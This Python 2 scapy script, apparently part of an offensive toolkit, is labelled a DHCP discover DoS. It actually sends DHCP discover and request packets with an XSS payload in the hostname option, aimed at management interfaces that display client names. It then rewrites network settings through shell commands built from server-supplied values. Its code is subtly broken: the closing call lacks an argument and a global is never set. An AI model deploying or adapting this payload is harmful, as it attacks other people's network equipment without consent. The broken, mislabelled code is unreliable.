# -*- coding: utf-8 -*-

from scapy.all import Ether, RandMAC, sendp, RandString,get_if_hwaddr,sniff,get_if_raw_hwaddr,srp1,ICMP,conf
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
import scapy.all

import netifaces
import os
global src_mac
global xi
global follow
global inter
global xss
# --------------------------------------------------------------------------
#                       DHCP DISCOVER DOS
# --------------------------------------------------------------------------

def run(interface,xs):

    """
    This function launch DHCP DISCOVER DOS attack
    :param inter: interface to be launched the attack
    :type inter: str
    """
    global src_mac
    global xi
    global follow
    global inter
    follow=False
    #if len(interface) > 0:
    inter = interface
    if xs == "":
        xss="<script>alert('hola')</script>"
    else:
        xss=xs

    try:

        src_mac= get_if_hwaddr(inter)
        print str(src_mac)
        ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=str(src_mac), type=0x800)
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        while not follow:
            xi = RandString(8, "1234567890abcdef")
            xi = "0x"+str(xi)
            res = src_mac.split(":")
            ch=""
            for i in res:
                ch=ch + chr(int(i,16))
            bootps = BOOTP(xid=int(xi,16), ciaddr='0.0.0.0',chaddr=ch)
            host = "<script>alert('hola')</script>"
            dhcps = DHCP(options=[("message-type", "discover"),("hostname",host), "end"])
            packet = ethernet / ip / udp / bootps / dhcps
            conf.checkIPaddr = False
            pkt=srp1(packet, iface=inter, verbose=1)
            if BOOTP in pkt:
                is_DHCP(pkt)
        #sniff(prn=is_DHCP, filter="udp and (port 67 or 68)", iface=inter
    except KeyboardInterrupt:
        pass


def run_attack(config):
    """ This function is used for launch the DHCP DISCOVER DOS attack
    :param config: GlobalParameters option instance
    :type config: `GlobalParameters`

    """
    run(config.interface,config.xss)

def is_DHCP(pkt):
    global src_mac
    global xi
    global follow
    global inter
    
    if DHCP in pkt:
        if pkt[BOOTP].op == 2:
            
            ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
            ip = IP(src="0.0.0.0", dst="255.255.255.255",id=0x00,tos=0x10)
            udp = UDP(sport=68, dport=67)
            res = src_mac.split(":")
            ch=""
            for i in res:
                ch=ch + chr(int(i,16))
            host = xss
            bootps = BOOTP(xid=int(xi,16), ciaddr='0.0.0.0',chaddr=ch)
            ipServer = pkt[IP].src
            ipCliente = pkt[BOOTP].yiaddr

            dhcps = DHCP(options=[("message-type", "request"),("server_id",ipServer),("requested_addr", ipCliente),
                                  ("hostname",host),
                                  ("param_req_list", chr(scapy.all.DHCPRevOptions["subnet_mask"][0]),
                                   chr(scapy.all.DHCPRevOptions["router"][0]),
                                   chr(scapy.all.DHCPRevOptions["name_server"][0]),
                                   chr(15)), "end"])
            packet = ethernet / ip / udp / bootps / dhcps
            pkt=srp1(packet, iface=inter, verbose=1)
            if DHCP in pkt:
                print pkt.summary()
                for x in pkt[DHCP].options:
                    if x[0] == "router":
                        gateway = x[1]
                    elif x[0] == "subnet_mask":
                        netmask = x[1]
                    elif x[0] == "name_server":
                        servername = x[1]
                    elif x[0] == "message-type":
                        messageType = x[1]
                if messageType == 5:        
                    os.system("ifconfig "+inter+" "+ipCliente+" netmask "+netmask)
                    os.system("cp /etc/resolv.conf /etc/resolv.conf.old")
                    os.system("echo nameserver "+servername+" > /etc/resolv.conf")
                    os.system("ip route add default via "+gateway+" dev "+inter)
            follow=True
run("eth0")
